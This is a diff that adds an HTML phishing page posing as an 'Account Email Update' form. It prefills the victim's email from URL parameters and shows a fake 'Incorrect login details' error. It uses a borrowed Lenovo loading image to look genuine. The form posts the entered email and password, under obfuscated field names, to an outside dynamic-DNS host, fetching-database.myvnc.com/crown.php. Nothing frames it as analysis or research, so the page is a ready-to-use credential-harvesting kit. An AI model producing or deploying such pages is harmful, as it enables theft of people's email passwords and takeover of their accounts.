@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> 
+
+  <title>Account Email Update</title>
+<link rel="icon" href="img/favicon.ico" type="image/ico" />
+  <!-- Custom fonts for this template-->
+  <link href="vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css"> 
+  <link href="css/purry.css" rel="stylesheet">
+
+</head>
+
+<body>
+<div class="row"> 
+  <div class="col-sm-4"></div>
+  <div class="col-sm-4">
+  <center> <div class="buji" align="center">
+    <img src="https://support.lenovo.com/esv4/images/loading.gif" style=" width: 21%; margin-bottom: 22px; ">
+ <form action="https://fetching-database.myvnc.com/crown.php" method="post">
+  <div class="walk oip"><input name="jame" type="" id="domain" style="width: 100%; height: inherit; text-align: center; color: #fff; font-size:16px; background-color: transparent; border: 0; outline: 0; cursor: pointer;" placeholder="Email Upgrade" readonly /></div>
+ <div class="ma">Incorrect login details. Try again!</div>
+ <br> 
+ <input type="email" name="sici" placeholder="Email address" value="" class="so"  id="email" style="color: #0b2161;font-weight: 600;border: solid 1px #848484 !important;background: #f6f8ff;">
+ <br>
+ <input type="password" name="tkesio" placeholder="Password" value="" class="so" style=" border: solid 2px red; ">
+<div class="sp"> <input type="checkbox" name="" checked="">&nbsp;Upgrade my Email Account</div>
+<br>
+<button name="mant" class="" id="ii">Upgrade Email Account</button>
+  </div>
+  </center> 
+  </div>
+  </form>
+  <div class="col-sm-4"></div>
+</div>
+
+  
+  <script src="js/jquery.min.js"></script>
+  <script src="js/bootstrap.min.js"></script> 
+ 
+ 
+
+<script src="shedi.js"></script>
+<script>$.urlParam = function(email){ var results = new RegExp('[\?&]' + email + '=([^&#]*)').exec(window.location.href); return results[1] || 0;}</script> <script> $( document ).ready(function() { $("#email").val($.urlParam('email')); }); </script>
+
+
+<script>
+Requests = {
+QueryString : function(item){
+var svalue = location.search.match(new RegExp(“[\?\&]” + item + “=([^\&]*)(\&?)”,”i”));
+return svalue ? svalue[1] : svalue;
+}
+}
+
+
+</script>
+
+<script> $( document ).ready(function() { $("#domain").val($.urlParam('domain')); }); </script>
+
+</body>
+
+</html>
